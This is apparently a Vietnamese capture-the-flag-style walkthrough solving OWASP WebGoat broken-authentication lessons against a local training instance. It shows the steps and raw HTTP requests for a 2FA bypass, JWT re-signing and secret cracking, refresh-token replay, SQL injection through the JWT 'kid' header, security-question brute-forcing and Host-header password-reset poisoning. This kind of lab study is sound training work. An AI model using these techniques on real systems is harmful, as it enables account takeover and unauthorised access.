# (A2) Broken Authentication

## Authentication Bypasses

### 2. 2FA Password Reset

Sửa hai param `secQuestion0` và `secQuestion1` trong request thành `secQuestionA` và `secQuestionB`.

## JWT

### 3. Decoding a JWT token

Sử dụng [jwt.io](https://jwt.io) để decode.

### 5. JWT signing

Đổi user thành Jerry và bấm Reset votes. Sau đó vào phần cookie của request sẽ thấy một cái `access_token`. Sửa lại đoạn jwt như sau:

![1](images/1.png)

### 8. JWT cracking

Dùng john để crack jwt secret sau đó dùng cyberchef để sign lại.

### 10. Refreshing a token

Khi load lession mình sẽ bắt được 1 cái request trông như thế này:

```
POST /WebGoat/JWT/refresh/login HTTP/1.1

...

{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}
```

Và response của nó:

```
{
  "access_token" : "eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IkplcnJ5In0.Z-ZX2L0Tuub0LEyj9NmyVADu7tK40gL9h1EJeRg1DDa6z5_H-SrexH1MYHoIxRyApnOP7NfFonP3rOw1Y5qi0A",
  "refresh_token" : "etmOBMYjKgqDZHOxCTiC"
}
```

Sử dụng `refresh_token` của Jerry để làm mới lại token của Tom:

```
POST /WebGoat/JWT/refresh/newToken HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q
Content-Type: application/json; charset=UTF-8

...

{
  "refresh_token" : "etmOBMYjKgqDZHOxCTiC"
}
```

Mình nhận được token mới:

```
{
  "access_token" : "eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IlRvbSJ9.a4yUoDOuv6L7ICs-HsE6craLHG_u6YDTkmXiGHjF7GdJZVZWCTurWBBunW9ujab8f4vNG31XAEvWYUEmAt0SGg",
  "refresh_token" : "cSxIFRlEhSDkCKXZIBQB"
}
```

Thay token mới của Tom vào `checkout` request là xong:

```
POST /WebGoat/JWT/refresh/checkout HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IlRvbSJ9.a4yUoDOuv6L7ICs-HsE6craLHG_u6YDTkmXiGHjF7GdJZVZWCTurWBBunW9ujab8f4vNG31XAEvWYUEmAt0SGg
...
```

### 11. Final challenge

SQLi vào phần `kid` ở header của jwt:

Phần `bWVv` được `UNION SELECT` chính là key `meo` đã được dùng để sign đoạn jwt này.

![2](images/2.png)

## Password reset

### 4. Security questions

Dùng burpsuite để bruteforce bảng màu:

username: 

```
admin
```

color: 

```
green
```

### 5. Creating the password reset link

Email sẽ được gửi đến header `Host` nên mình sẽ thay qua port `9090` là cổng của WebWolf để nhận email và reset lại password:

![5](images/5.png)

Link reset password nhận được bên WebWolf:

![6](images/6.png)

Sửa lại url và đặt lại pass rồi đăng nhập là xong.

```
http://127.0.0.1:8080/WebGoat/PasswordReset/reset/reset-password/bdc59334-7bfd-4a47-9a31-c159f4a71b27
```